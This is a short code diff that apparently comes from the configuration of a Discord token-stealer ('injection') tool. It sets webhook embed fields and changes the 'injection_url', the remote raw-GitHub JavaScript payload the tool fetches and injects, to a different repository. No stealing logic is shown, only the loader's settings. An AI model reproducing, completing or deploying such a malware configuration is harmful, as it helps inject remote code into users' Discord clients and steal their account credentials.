@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Daten', 
   embed_icon: 'https://cdn.discordapp.com/avatars/1122654115915382794/99c1868613792552446d9f019f9dc545.png?size=1024'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/schatten3x/testt/main/test.js', 
   /**
    
    **/
